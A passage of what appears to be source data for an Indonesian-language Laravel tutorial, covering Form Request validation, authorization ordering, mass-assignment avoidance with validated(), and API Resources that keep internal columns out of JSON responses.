        'Baris terakhir adalah bentuk pembusukan yang paling sunyi. Factory yang tidak diperbarui setelah kolom baru ditambahkan tetap menghasilkan data yang lolos, sebab kolom barunya punya nilai bawaan. Test yang memakainya tetap hijau, dan yang diujinya adalah bentuk data yang tidak pernah lagi muncul di produksi. Karena itu factory layak diperlakukan sebagai bagian dari skema, yaitu ikut diperbarui pada perubahan yang sama dengan migrasinya.',
      ),
      references(
        {
          label: 'Eloquent: Factories',
          href: 'https://laravel.com/docs/12.x/eloquent-factories',
          source: 'Laravel',
          note: 'Bentuk `definition()`, state, dan pembuatan relasi lewat `has()`.',
        },
        {
          label: 'Database: Seeding',
          href: 'https://laravel.com/docs/12.x/seeding',
          source: 'Laravel',
          note: 'Menjalankan seeder, dan pemakaiannya bersama `migrate:fresh --seed`.',
        },
        {
          label: 'Testing: Getting Started',
          href: 'https://laravel.com/docs/12.x/testing',
          source: 'Laravel',
          note: '`actingAs`, `getJson`, dan assertion yang dipakai contoh tes IDOR di atas.',
        },
        {
          label: 'Authorization Testing',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Kenapa menguji otorisasi **negatif** adalah tes yang paling sering dilewatkan.',
        },
      ),
    ],
  ),

  written(
    'form-request',
    'Validasi dengan Form Request',
    19,
    'Padanan Zod di Laravel — validasi dan otorisasi dalam satu kelas.',
    [
      terms(
        {
          term: 'Form Request',
          meaning:
            'Kelas yang memuat **aturan validasi dan otorisasi** untuk satu jenis permintaan. Ia padanan skema Zod dari Bab 3 — bedanya, Laravel menjalankannya otomatis sebelum controller, jadi tidak ada middleware yang perlu dipasang.',
        },
        {
          term: 'authorize()',
          meaning:
            'Metode yang berjalan **sebelum** validasi. Mengembalikan `false` menghasilkan `403`. Urutannya disengaja: tidak ada gunanya memvalidasi permintaan dari orang yang memang tidak berhak.',
        },
        {
          term: 'rules()',
          meaning:
            "Metode yang mengembalikan aturan per field, ditulis sebagai array — `['required', 'string', 'max:200']`. Bentuk array lebih baik daripada string berpipa (`'required|string'`) karena aturan yang memuat karakter khusus tidak jadi ambigu.",
        },
        {
          term: 'required vs sometimes',
          meaning:
            '`required` berarti field **wajib ada dan tidak kosong**. `sometimes` berarti "validasi hanya kalau field ini dikirim" — persis yang dibutuhkan `PATCH`, di mana klien hanya mengirim sebagian field.',
        },
        {
          term: 'tag_ids.*',
          meaning:
            'Notasi titik-bintang untuk memvalidasi **setiap elemen** sebuah array. `tag_ids` memeriksa arraynya (tipe dan panjang maksimum), `tag_ids.*` memeriksa isinya satu per satu.',
        },
        {
          term: 'exists',
          meaning:
            'Aturan yang memeriksa nilainya **benar-benar ada di database** — `exists:tag,id`. Ia menutup kelas bug yang tidak tertangkap pemeriksaan tipe: id yang formatnya benar tapi menunjuk baris yang tidak ada.',
        },
        {
          term: 'Rule::enum',
          meaning:
            'Memvalidasi nilai terhadap sebuah enum PHP. Lebih baik daripada `in:draf,terbit` karena daftar nilainya hidup di **satu tempat** — menambah status baru cukup di enum-nya, tidak perlu mencari semua tempat yang menuliskannya.',
        },
        {
          term: 'validated()',
          meaning:
            'Mengembalikan **hanya field yang punya aturan** dan lolos. Ini yang membuatnya aman dioper ke `create()`: field asing yang dikirim klien tidak ikut, karena ia tidak pernah ada di `rules()`.',
        },
        {
          term: '422 otomatis',
          meaning:
            'Kalau validasi gagal, Laravel langsung menjawab `422` dengan bentuk `{ message, errors: { field: [...] } }` — tanpa kamu menulis apa pun. Bentuk itu konsisten di seluruh aplikasi, jadi klien cukup menulis satu penangan.',
        },
      ),

      h2('Membuatnya'),
      code(
        'bash',
        `
        php artisan make:request SimpanCatatanRequest
        `,
      ),
      code(
        'php',
        `
        <?php

        declare(strict_types=1);

        namespace App\\Http\\Requests;

        use Illuminate\\Foundation\\Http\\FormRequest;
        use Illuminate\\Validation\\Rule;

        final class SimpanCatatanRequest extends FormRequest
        {
            // Otorisasi dijalankan SEBELUM validasi.
            public function authorize(): bool
            {
                $catatan = $this->route('catatan');

                // Membuat baru: cukup sudah masuk.
                // Mengubah: harus pemiliknya.
                return $catatan === null
                    ? $this->user() !== null
                    : $this->user()->can('update', $catatan);
            }

            public function rules(): array
            {
                return [
                    'judul' => ['required', 'string', 'min:1', 'max:200'],
                    'isi' => ['required', 'string', 'max:10000'],
                    'diarsipkan' => ['sometimes', 'boolean'],

                    'tag_ids' => ['sometimes', 'array', 'max:10'],
                    'tag_ids.*' => ['integer', 'exists:tag,id'],

                    'status' => ['sometimes', Rule::enum(StatusArtikel::class)],
                ];
            }

            public function messages(): array
            {
                return [
                    'judul.required' => 'Judul wajib diisi.',
                    'judul.max' => 'Judul maksimal 200 karakter.',
                ];
            }

            // Normalisasi sebelum divalidasi
            protected function prepareForValidation(): void
            {
                $this->merge([
                    'judul' => trim((string) $this->input('judul')),
                ]);
            }
        }
        `,
      ),
      p(
        "Sebuah Form Request menyatukan dua penjagaan yang di Express tersebar di dua middleware terpisah, dan urutannya penting karena `authorize()` dijalankan **sebelum** `rules()`. Artinya permintaan dari orang yang tidak berhak ditolak `403` tanpa servermu repot memvalidasi isinya. Perhatikan bagaimana method itu membedakan dua kasus lewat `$this->route('catatan')`. Kalau tidak ada model di rutenya berarti ini pembuatan baru sehingga cukup sudah masuk, sedangkan kalau ada berarti pengubahan dan Policy `update` yang menentukan.",
      ),
      p(
        'Di dalam `rules()`, perhatikan beda `required` dan `sometimes`. `required` berarti field itu **wajib ada**, sedangkan `sometimes` berarti "kalau dikirim, harus lolos aturan ini", dan itulah yang tepat untuk `PATCH` yang hanya mengirim sebagian kolom. Pasangan `tag_ids` dan `tag_ids.*` juga bekerja pada tingkat berbeda, sebab yang pertama memeriksa arraynya berupa bertipe array dan maksimal sepuluh elemen, sedangkan yang kedua memeriksa **setiap isinya**. Tanpa `max:10`, satu permintaan bisa mengirim sepuluh ribu tag dan memaksa sepuluh ribu pemeriksaan `exists`.',
      ),
      p(
        'Aturan `exists:tag,id` menutup kelas bug yang tidak tertangkap pemeriksaan tipe: id `999` berbentuk integer yang sah tetapi menunjuk baris yang tidak ada, dan tanpa aturan ini kegagalannya baru muncul sebagai pelanggaran foreign key jauh di dalam. `Rule::enum(StatusArtikel::class)` lebih baik daripada menuliskan `in:draf,terbit` karena daftar nilainya hidup di **satu tempat** — menambah status baru cukup di enum-nya.',
      ),
      p(
        'Method `prepareForValidation()` berjalan **sebelum** aturan diterapkan, dan itulah tempat yang benar untuk normalisasi. `trim()` di sana memastikan judul berisi tiga spasi ditolak oleh `min:1`, bukan tersimpan sebagai judul kosong — urutan yang sama seperti `.trim()` sebelum `.min(1)` pada skema Zod di sub-bab 3.13. Sementara `messages()` mengganti pesan bawaan berbahasa Inggris dengan kalimat yang layak ditampilkan ke pengguna, per field dan per aturan.',
      ),

      h2('Memakainya'),
      code(
        'php',
        `
        // Cukup tulis tipenya — Laravel memvalidasi sebelum method dijalankan.
        // Kalau gagal: otomatis 422 dengan detail per field.
        // Kalau authorize() false: otomatis 403.
        public function store(SimpanCatatanRequest $request): JsonResponse
        {
            $catatan = $request->user()->catatan()->create($request->validated());

            return (new CatatanResource($catatan))->response()->setStatusCode(201);
        }
        `,
      ),
      p(
        'Perhatikan tidak ada satu pun pemanggilan validasi di dalam method ini — yang ada hanyalah **tipe** `SimpanCatatanRequest` pada parameternya. Laravel melihat tipe itu, membangun objeknya lewat service container, lalu menjalankan `authorize()` dan `rules()` **sebelum** badan method dijalankan. Jadi kalau baris pertama tercapai, kamu sudah dijamin dua hal sekaligus: peminta berhak, dan datanya sah.',
      ),
      p(
        'Bandingkan dengan Express di sub-bab 3.13, yang memasang `validasiBody(Skema)` sebagai middleware terpisah di daftar rute. Keduanya menjalankan disiplin yang sama; bedanya, Laravel menempelkannya pada tipe parameter sehingga tidak mungkin ada handler yang lupa dipasangi validasinya. Perhatikan `$request->validated()` yang dioper ke `create()` — inilah yang membuat rangkaiannya aman, dan mengganti satu kata itu menjadi `all()` cukup untuk membuka mass assignment.',
      ),
      callout(
        'danger',
        'Pakai `validated()`, jangan `all()`',
        '`$request->all()` mengembalikan **seluruh** isi permintaan, termasuk field yang tidak pernah kamu validasi. Mengopernya ke `create()` adalah pintu mass assignment. `validated()` hanya berisi field yang punya aturan — itulah yang membuat perlindungannya bekerja.',
      ),

      h2('Aturan yang sering dipakai'),
      code(
        'php',
        `
        'email' => ['required', 'email:rfc,dns', 'max:255', 'unique:users,email'],
        'password' => ['required', Password::min(12)->letters()->numbers()->uncompromised()],
        'umur' => ['required', 'integer', 'min:17', 'max:120'],
        'peran' => ['required', Rule::in(['penulis', 'editor'])],
        'mulai' => ['required', 'date'],
        'selesai' => ['required', 'date', 'after:mulai'],
        'berkas' => ['required', 'file', 'mimes:pdf,jpg', 'max:2048'],

        // unique yang mengabaikan baris ini sendiri saat mengubah
        'email' => ['required', 'email', Rule::unique('users')->ignore($this->user()->id)],
        `,
      ),
      p(
        'Beberapa di antaranya menyentuh database dan itu perlu disadari. `unique:users,email` menjalankan query untuk memastikan emailnya belum dipakai — berguna karena ia menghasilkan pesan `422` yang ramah alih-alih error `23505` yang mentah, tetapi ia **bukan** pengganti batasan `UNIQUE` di tabel: dua pendaftaran yang tiba bersamaan bisa sama-sama lolos pemeriksaan ini, dan hanya batasan di database yang menangkapnya.',
      ),
      p(
        'Baris terakhir menutup jebakan klasik pada formulir edit. Tanpa `->ignore(...)`, aturan `unique` akan menolak permintaan seorang pengguna yang menyimpan profilnya **tanpa mengubah emailnya** — karena email itu memang sudah ada di tabel, yaitu miliknya sendiri. `ignore` mengecualikan baris tersebut dari pemeriksaan. Perhatikan pula `after:mulai` pada `selesai`: aturan yang membandingkan **dua field**, padanan `.refine()` dari sub-bab 3.13. Dan `mimes:pdf,jpg` memeriksa jenis berkas dari isinya, bukan dari ekstensi nama yang dikirim klien.',
      ),
      callout(
        'tip',
        '`uncompromised()` memeriksa kebocoran password',
        'Ia mencocokkan password ke basis data kebocoran publik memakai k-anonymity — hanya lima karakter pertama hash yang dikirim, jadi password aslinya tidak pernah keluar. Password yang sudah bocor di tempat lain adalah target pertama serangan credential stuffing.',
      ),

      h2('Membandingkan dengan Zod'),
      table(
        ['Zod (Express)', 'Form Request (Laravel)'],
        [
          ['`z.string().max(200)`', "`['string', 'max:200']`"],
          ['`.strict()`', '`validated()` (hanya field yang punya aturan)'],
          ['Middleware terpisah', 'Type-hint di controller'],
          ['`safeParse` lalu lempar error', 'Otomatis 422'],
          ['Otorisasi di middleware terpisah', '`authorize()` di kelas yang sama'],
        ],
      ),

      h2('Validasi bukan pengganti otorisasi'),
      code(
        'php',
        `
        // Validasi memastikan tag_ids berisi id yang ADA.
        'tag_ids.*' => ['integer', 'exists:tag,id'],

        // Ia TIDAK memastikan tag itu boleh dipakai pengguna ini.
        // Kalau tag bersifat privat per pengguna, tambahkan syaratnya:
        'tag_ids.*' => [
            'integer',
            Rule::exists('tag', 'id')->where('pemilik_id', $this->user()->id),
        ],
        `,
      ),
      p(
        'Perbedaan ini halus dan penting: `exists` menjawab "apakah ada", bukan "apakah boleh". Keduanya pemeriksaan yang berbeda.',
      ),
      h2('Studi kasus di project nyata'),
      p(
        'Form Request memindahkan validasi keluar dari controller, dan manfaat terbesarnya bukan kerapian melainkan bahwa aturan itu menjadi **satu-satunya pintu**. Selama controller memakai hasil validasinya dan bukan permintaan mentahnya, tidak ada field yang bisa lolos tanpa dideklarasikan.',
      ),
      code(
        'php',
        `
        <?php
        declare(strict_types=1);

        final class BuatPesananRequest extends FormRequest
        {
            // Otorisasi dan validasi adalah dua hal berbeda, dan keduanya di sini.
            public function authorize(): bool
            {
                return $this->user()?->can('buat', Pesanan::class) ?? false;
            }

            public function rules(): array
            {
                return [
                    'produk_id' => ['required', 'integer', 'exists:produk,id'],
                    'jumlah'    => ['required', 'integer', 'min:1', 'max:99'],
                    'catatan'   => ['nullable', 'string', 'max:500'],

                    // Aturan untuk ARRAY dan isinya, masing-masing terpisah.
                    'item'          => ['required', 'array', 'min:1', 'max:50'],
                    'item.*.produk' => ['required', 'integer', 'exists:produk,id'],
                    'item.*.jumlah' => ['required', 'integer', 'min:1', 'max:99'],
                ];
            }

            public function messages(): array
            {
                return ['item.max' => 'Maksimal 50 item dalam satu pesanan.'];
            }
        }
        `,
        { caption: 'Batas max pada array dan string itu kontrol ketersediaan, bukan kerewelan.' },
      ),
      p(
        'Batas `max` pada `item` dan `catatan` layak ditegaskan karena fungsinya sering disalahpahami sebagai pembatasan pengguna. Ia sebenarnya perlindungan terhadap ketersediaan, dan alasannya sudah diukur di bab Express, yaitu satu permintaan yang memaksa server mengerjakan pekerjaan sangat besar menahan utasnya dan membuat seluruh permintaan lain menunggu.',
      ),
      p(
        'Bagian `item.*.produk` menunjukkan kemampuan yang paling membedakan validasi berskema dari rangkaian `if` yang ditulis tangan, yaitu **letak kesalahannya ikut disebutkan**. Bentuk yang sama sudah diukur dengan zod di bab Express.',
      ),
      code(
        'text',
        `
        Issues untuk satu badan permintaan yang salah di tujuh tempat:

          ["email"]              Invalid email address
          ["alamat","jalan"]     Too small: expected string to have >=1 characters
          ["alamat","kodePos"]   Kode pos harus 5 digit
          ["item",0,"produkId"]  Too small: expected number to be >0
          ["item",0,"jumlah"]    Too small: expected number to be >=1
          ["item",1,"jumlah"]    Too big: expected number to be <=99
          ["setuju"]             Syarat dan ketentuan wajib disetujui
        `,
        {
          caption:
            'Dijalankan sungguhan dengan zod 4.4.3 di bab Express; Laravel menghasilkan bentuk yang setara.',
        },
      ),
      p(
        'Path yang memuat **indeks array** itu yang memungkinkan antarmuka menyorot item pertama dan item kedua secara terpisah. Rangkaian `if` yang ditulis tangan biasanya berhenti pada kesalahan pertama dan tidak tahu di indeks mana ia terjadi.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Form Request punya beberapa perilaku yang mengejutkan bila tidak diketahui, dan yang pertama menyangkut apa yang terjadi ketika validasinya gagal.',
      ),
      code(
        'text',
        `
        Permintaan yang MENGHARAPKAN JSON (header Accept: application/json):
          -> 422 dengan badan { "message": "...", "errors": { "jumlah": ["..."] } }

        Permintaan dari formulir HTML biasa:
          -> 302 kembali ke halaman sebelumnya, dengan error di session

        Dua perilaku berbeda dari SATU kode yang sama, dan yang menentukan
        adalah header Accept dari pemanggil. Klien API yang lupa mengirim
        header itu akan menerima PENGALIHAN, bukan pesan validasi —
        dan itu sering terlihat sebagai "endpoint-nya tidak merespons apa-apa".
        `,
      ),
      p(
        'Perilaku kedua yang menjebak adalah **urutan** antara `authorize` dan `rules`. Laravel menjalankan `authorize` lebih dulu, jadi permintaan yang tidak berwenang dijawab `403` tanpa validasinya pernah berjalan. Itu benar dan diinginkan, sebab pesan validasi yang rinci untuk permintaan yang tidak berhak sendiri merupakan kebocoran keterangan.',
      ),
      code(
        'php',
        `
        // Perilaku bawaan authorize() yang tidak dituliskan:
        public function authorize(): bool
        {
            return true;     // <-- INI bawaannya bila method-nya tidak ditulis
        }

        // Jadi Form Request yang TIDAK menulis authorize() memperbolehkan
        // siapa pun yang lolos middleware. Itu sering benar — otorisasinya
        // memang di tempat lain — tapi harus keputusan yang SADAR,
        // bukan sesuatu yang terjadi karena method-nya lupa ditulis.
        `,
      ),
      p(
        'Kegagalan ketiga tidak menghasilkan error dan menghapus seluruh manfaat Form Request, yaitu memakai `$request->all()` setelah validasinya berjalan.',
      ),
      code(
        'php',
        `
        // SALAH: validasinya berjalan, hasilnya dibuang.
        public function store(BuatPesananRequest $request)
        {
            Pesanan::create($request->all());     // <-- field asing ikut masuk
        }

        // BENAR: pakai hasil validasinya.
        public function store(BuatPesananRequest $request)
        {
            Pesanan::create($request->validated());
            // atau lebih sempit lagi:
            Pesanan::create($request->safe()->only(['produk_id', 'jumlah', 'catatan']));
        }
        `,
        {
          caption:
            'Ini bentuk Laravel dari aturan yang sama di bab Express: pakai hasil parsing, bukan badan mentah.',
        },
      ),
      p(
        'Perbedaannya persis sama dengan yang diukur di bab Express dengan zod, yaitu skema membuang kunci yang tidak dideklarasikan, dan seluruh perlindungan itu hilang begitu kamu kembali membaca permintaan mentahnya.',
      ),
      code(
        'text',
        `
        Diukur sungguhan dengan zod 4.4.3:

          z.object({ nama: z.string() }).parse({ nama: 'Rina', peran: 'admin' })
            -> {"nama":"Rina"}            <- kunci "peran" DIBUANG

        Laravel melakukan hal yang setara lewat validated(), dan seperti zod,
        ia hanya berlaku pada hasilnya — bukan pada $request->all().
        `,
        { caption: 'Dijalankan sungguhan di bab Express. Prinsipnya identik di kedua ekosistem.' },
      ),
      p(
        'Satu kegagalan terakhir menyangkut aturan yang melibatkan basis data, dan biayanya sering tidak disadari.',
      ),
      code(
        'php',
        `
        'produk_id' => ['required', 'integer', 'exists:produk,id'],

        // Aturan exists menjalankan SATU query. Untuk 'item.*.produk' pada
        // array berisi 50 item, itu 50 query — bentuk N+1 di dalam validasi.
        //
        // Untuk array, periksa sekali untuk seluruh nilainya:
        'item' => [
            'required', 'array', 'max:50',
            function (string $atribut, array $nilai, Closure $gagal) {
                $id = collect($nilai)->pluck('produk')->unique();
                $ada = Produk::whereIn('id', $id)->pluck('id');
                if ($id->diff($ada)->isNotEmpty()) $gagal('Ada produk yang tidak dikenal.');
            },
        ],
        `,
        { caption: 'Satu query untuk seluruh item, menggantikan satu query per item.' },
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Validasi adalah tempat di mana mengerjakan setengahnya sering lebih berbahaya daripada tidak mengerjakannya sama sekali, sebab ia memberi rasa aman yang tidak berdasar.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Memvalidasi lalu memakai `$request->all()`',
            'Sudah divalidasi',
            'Field asing yang dibuang validasi kembali masuk. Seluruh perlindungannya hilang. Pakai `validated()`',
          ],
          [
            'Tidak menulis `authorize()`',
            'Otorisasinya di middleware',
            'Bawaannya `true`. Sering benar, tapi harus keputusan sadar, bukan akibat method yang lupa ditulis',
          ],
          [
            'Tidak memberi batas `max` pada string dan array',
            'Penggunanya tidak akan mengirim sebanyak itu',
            'Endpoint bisa dipanggil langsung. Batas adalah kontrol ketersediaan, bukan pembatasan pengguna',
          ],
          [
            'Memakai `exists` di dalam `item.*`',
            'Tiap item memang harus diperiksa',
            'Satu query per item. Untuk 50 item berarti 50 query. Periksa sekali untuk seluruh nilainya',
          ],
          [
            'Mengandalkan validasi di sisi klien',
            'Formulirnya sudah memeriksa',
            'Klien bisa dilewati sepenuhnya. Validasi klien adalah pengalaman pengguna, bukan kontrol',
          ],
          [
            'Menaruh aturan bisnis di dalam `rules()`',
            'Sama-sama pemeriksaan',
            '"Stok harus cukup" bukan validasi bentuk melainkan aturan bisnis. Tempatnya di service, dan jawabannya `409`',
          ],
        ],
      ),
      p(
        'Baris terakhir memuat pembedaan yang halus dan berguna. Validasi menjawab "apakah bentuk permintaannya masuk akal", dan jawabannya tidak bergantung pada keadaan sistem. Aturan bisnis menjawab "apakah ini boleh terjadi sekarang", dan jawabannya bergantung pada stok, saldo, atau status yang bisa berubah kapan saja. Menaruh yang kedua di dalam `rules()` menghasilkan `422` untuk sesuatu yang sebenarnya `409`, dan membuat aturannya tidak bisa dipakai dari luar HTTP, misalnya dari perintah CLI atau job latar.',
      ),
      references(
        {
          label: 'Validation — Form Request Validation',
          href: 'https://laravel.com/docs/12.x/validation#form-request-validation',
          source: 'Laravel',
          note: 'Bentuk `authorize()`, `rules()`, dan urutan keduanya dijalankan.',
        },
        {
          label: 'Available Validation Rules',
          href: 'https://laravel.com/docs/12.x/validation#available-validation-rules',
          source: 'Laravel',
          note: 'Daftar lengkap aturan, termasuk `exists`, `unique`, dan `Rule::enum`.',
        },
        {
          label: 'Password Validation Rule',
          href: 'https://laravel.com/docs/12.x/validation#validating-passwords',
          source: 'Laravel',
          note: '`uncompromised()` yang memeriksa kebocoran lewat k-anonymity.',
        },
        {
          label: 'Input Validation Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Batas antara validasi dan otorisasi — "apakah ada" versus "apakah boleh".',
        },
      ),
    ],
  ),

  written(
    'api-resource',
    'API Resource & Transformasi Respons',
    19,
    'Memisahkan bentuk JSON dari bentuk tabel.',
    [
      p(
        'Mengembalikan model Eloquent langsung berarti bentuk respons API-mu ditentukan oleh struktur tabel. Setiap kolom baru otomatis ikut terkirim — termasuk yang tidak seharusnya.',
      ),

      terms(
        {
          term: 'API Resource',
          meaning:
            'Kelas yang mengubah model menjadi bentuk JSON **yang kamu tentukan**. Tanpanya, bentuk respons API-mu ditentukan struktur tabel — dan setiap kolom baru otomatis ikut terkirim.',
        },
        {
          term: 'kebocoran lewat model',
          meaning:
            'Masalah yang diselesaikan sub-bab ini. `catatan_internal` dan `skor_moderasi` ikut terkirim **bukan karena ada yang mengubah endpoint**, melainkan karena kolomnya ditambahkan ke tabel bulan lalu. Tidak ada kode yang salah — dan itu yang membuatnya sulit tertangkap.',
        },
        {
          term: 'toArray()',
          meaning:
            'Metode Resource yang mengembalikan bentuk akhir JSON-nya. Di sinilah kamu **memilih field satu per satu**, dan itulah yang membuat kolom baru tidak pernah bocor tanpa keputusan sadar.',
        },
        {
          term: 'ResourceCollection',
          meaning:
            'Bentuk Resource untuk **daftar**. `CatatanResource::collection($paginator)` membungkus setiap item sekaligus menyertakan metadata paginasi — jadi bentuk daftar dan bentuk item tunggal tetap konsisten.',
        },
        {
          term: 'whenLoaded',
          meaning:
            'Menyertakan relasi **hanya kalau ia sudah di-eager-load**. Tanpa itu, Resource yang menyebut `$this->penulis` akan memicu query per item — N+1 yang lahir di lapisan penyajian, bukan di query-nya.',
        },
        {
          term: 'when',
          meaning:
            'Menyertakan field **hanya kalau syaratnya terpenuhi** — misalnya field yang hanya boleh dilihat pemiliknya. Ia membuat satu Resource bisa melayani beberapa tingkat kewenangan tanpa membuat kelas terpisah.',
        },
        {
          term: 'wrap',
          meaning:
            'Pembungkus `"data"` di sekeliling respons. Laravel memasangnya secara default — dan itu sesuai anjuran Bab 1: jangan mengirim array telanjang, karena menambahkan metadata nanti jadi perubahan yang memutus klien.',
        },
        {
          term: 'penamaan field API',
          meaning:
            'Nama di JSON **tidak harus** sama dengan nama kolom. Resource adalah tempat menerjemahkannya — `penulis_id` di tabel bisa menjadi objek `penulis` di API, tanpa mengubah skema database.',
        },
        {
          term: 'Resource vs $hidden',
          meaning:
            'Keduanya menyembunyikan field, tapi berbeda arah. `$hidden` adalah **blocklist**, sehingga kolom baru otomatis terlihat. Resource adalah **allow-list**, sehingga kolom baru otomatis tersembunyi sampai kamu menyebutnya. Yang kedua yang benar untuk API.',
        },
      ),

      h2('Masalahnya'),
      code(
        'php',
        `
        // Mengembalikan model apa adanya
        return Catatan::find(1);
        `,
      ),
      code(
        'json',
        `
        {
          "id": 1,
          "penulis_id": 42,
          "judul": "Catatan",
          "isi": "...",
          "catatan_internal": "pengguna ini mencurigakan",
          "skor_moderasi": 0.83,
          "created_at": "2026-08-02T10:00:00.000000Z"
        }
        `,
      ),
      p(
        'Dua field terakhir tidak pernah dimaksudkan untuk klien. Mereka ikut karena ditambahkan ke tabel bulan lalu, dan tidak ada yang mengubah endpoint-nya.',
      ),

      h2('Resource'),
      code(
        'bash',
        `
        php artisan make:resource CatatanResource
        `,
      ),
      code(
        'php',
        `
        <?php

        declare(strict_types=1);

        namespace App\\Http\\Resources;

        use Illuminate\\Http\\Request;
        use Illuminate\\Http\\Resources\\Json\\JsonResource;

        final class CatatanResource extends JsonResource
        {
            public function toArray(Request $request): array
            {
                return [
                    'id' => $this->id,
                    'judul' => $this->judul,
                    'isi' => $this->isi,
                    'diarsipkan' => $this->diarsipkan,
                    'dibuatPada' => $this->created_at->toIso8601String(),

                    // whenLoaded: TIDAK memicu query kalau relasinya belum dimuat.
                    // Ini yang mencegah N+1 muncul dari lapisan respons.
                    'penulis' => new PenggunaResource($this->whenLoaded('penulis')),
                    'jumlahKomentar' => $this->whenCounted('komentar'),

                    // Hanya untuk pemiliknya
                    'catatanInternal' => $this->when(
                        $request->user()?->can('lihatInternal', $this->resource) ?? false,
                        fn () => $this->catatan_internal,
                    ),
                ];
            }
        }
        `,
      ),
      p(
        'Resource adalah **allow-list untuk data yang keluar**, kebalikan dari `$fillable` yang mengatur data masuk. Karena setiap field disebut satu per satu di `toArray()`, kolom baru yang ditambahkan ke tabel bulan depan **tidak** otomatis ikut terkirim — tepat masalah yang ditunjukkan JSON mentah di atas. Ini padanan langsung dari "sebutkan kolomnya, jangan `SELECT *`" di sub-bab 3.10, hanya diterapkan di lapisan respons.',
      ),
      p(
        "`whenLoaded('penulis')` adalah baris yang paling mudah diremehkan. Menulis `new PenggunaResource($this->penulis)` akan **memicu satu query per item** kalau relasinya belum di-eager-load — N+1 yang lahir di lapisan respons, jauh dari controller tempat orang mencarinya. `whenLoaded` hanya menyertakan field itu kalau relasinya memang sudah dimuat, dan diam kalau belum. `whenCounted` melakukan hal setara untuk `withCount`.",
      ),
      p(
        'Blok `when(...)` terakhir memperlihatkan bahwa bentuk respons bisa **berbeda per pengguna**, karena `catatanInternal` hanya muncul bagi yang lolos Policy `lihatInternal`. Perhatikan nilainya dibungkus closure `fn () => ...`, sehingga `catatan_internal` baru dibaca ketika syaratnya terpenuhi. Perhatikan pula `?->` dan `?? false`, sebab permintaan tanpa pengguna yang masuk menghasilkan `false` sehingga ketiadaan identitas berujung pada **tidak menampilkan**, bukan pada error maupun kebocoran.',
      ),
      callout(
        'danger',
        '`whenLoaded` bukan sekadar kerapian',
        'Menulis `new PenggunaResource($this->penulis)` akan **memicu satu query per item** kalau relasinya belum di-eager-load. Pada daftar berisi 100 catatan, itu 100 query tambahan — N+1 yang muncul dari lapisan respons, bukan dari controller.',
      ),

      h2('Memakainya'),
      code(
        'php',
        `
        // Satu item
        return new CatatanResource($catatan);

        // Koleksi
        return CatatanResource::collection($catatan);

        // Dengan paginasi: meta dan link otomatis ikut
        return CatatanResource::collection(
            Catatan::with('penulis')->paginate(20),
        );
        `,
      ),
      code(
        'json',
        `
        {
          "data": [ { "id": 1, "judul": "..." } ],
          "links": { "first": "...", "last": "...", "prev": null, "next": "..." },
          "meta": { "current_page": 1, "per_page": 20, "total": 137 }
        }
        `,
      ),
      p(
        'Perhatikan hasilnya dibungkus kunci `data`, bukan array telanjang di tingkat teratas. Itu bawaan Laravel, dan ia yang membuat penambahan `links` serta `meta` mungkin tanpa memutus klien — bandingkan dengan respons berbentuk array polos, yang tidak punya tempat untuk metadata sama sekali. Bentuk `{ data, meta }` ini sama seperti kontrak yang dipakai di Bab 3.',
      ),
      p(
        "Blok `links` dan `meta` muncul **otomatis** hanya ketika yang dioper ke `collection()` adalah hasil `paginate()`. Perhatikan pula `Catatan::with('penulis')` pada contoh terakhir: eager loading harus dipasang di sini, karena `whenLoaded` di Resource sengaja tidak memuat apa pun sendiri. Keduanya bekerja berpasangan — controller yang memutuskan relasi apa yang dimuat, Resource yang memutuskan apa yang ditampilkan.",
      ),

      h2('Penamaan field yang konsisten'),
      code(
        'php',
        `
        // Database memakai snake_case; API bisa memakai camelCase.
        // Yang penting: KONSISTEN di seluruh API.
        'dibuatPada' => $this->created_at->toIso8601String(),
        'jumlahKomentar' => $this->whenCounted('komentar'),
        `,
      ),
      p(
        'Resource adalah tempat kedua konvensi penamaan bertemu, sebab kolom database memakai `snake_case` sesuai kebiasaan SQL sementara klien JavaScript lebih nyaman dengan `camelCase`. Karena penerjemahannya terjadi di satu lapisan ini, mengubah nama kolom di database nanti tidak memutus klien mana pun, sebab nama yang dipakai API ditentukan di sini alih-alih oleh bentuk tabel. Yang penting bukan pilihan gayanya melainkan **konsistensinya**, karena campuran `created_at` dan `dibuatPada` dalam satu respons memaksa klien mengingat mana yang mana.',
      ),
      callout(
        'warning',
        'Tanggal selalu ISO 8601 dengan zona waktu',
        '`toIso8601String()` menghasilkan `2026-08-02T10:00:00+00:00` — tidak ambigu, dan bisa diurai setiap bahasa. Mengirim `"2 Agustus 2026"` memaksa klien mengurai teks berbahasa Indonesia, dan mengirim tanggal tanpa zona waktu membuat jamnya berarti berbeda bagi setiap pembaca.',
      ),

      h2('Menambahkan metadata'),
      code(
        'php',
        `
        return (new CatatanResource($catatan))
            ->additional([
                'meta' => ['versi' => 'v1'],
            ]);
        `,
      ),
      p(
        '`additional()` menyisipkan kunci tambahan **di samping** `data` dan bukan di dalamnya, sehingga bentuk `data` yang sudah menjadi kontrak dengan klien tidak berubah. Ini tempat yang tepat untuk hal yang menerangkan responsnya alih-alih isinya, misalnya nomor versi API, penanda apakah datanya berasal dari cache, atau id permintaan untuk penelusuran. Perhatikan yang tidak boleh ditaruh di sini adalah data sumber daya itu sendiri, sebab begitu klien harus membaca `meta` untuk mendapat isi, kontraknya jadi kabur.',
      ),

      h2('Kaitannya dengan Bab 3.9'),
      p(
        'Resource menyelesaikan masalah yang sama dengan aturan "jangan kirim hasil `SELECT *`" di Express — hanya dengan cara yang lebih terstruktur. Prinsipnya identik: **bentuk respons adalah kontrak yang kamu putuskan sadar**, bukan cerminan otomatis dari struktur tabel.',
      ),
      h2('Studi kasus di project nyata'),
      p(
        'API Resource menjawab satu pertanyaan yang terlihat sepele dan berakibat besar, yaitu **apa yang keluar dari aplikasimu**. Tanpa lapisan itu, jawabannya adalah "apa pun yang kebetulan ada di model", dan jawaban itu berubah setiap kali seseorang menambah kolom.',
      ),
      code(
        'php',
        `
        // Tanpa Resource. Terlihat paling sederhana.
        return Pengguna::find($id);

        // Yang benar-benar keluar adalah SELURUH kolom tabel, termasuk yang
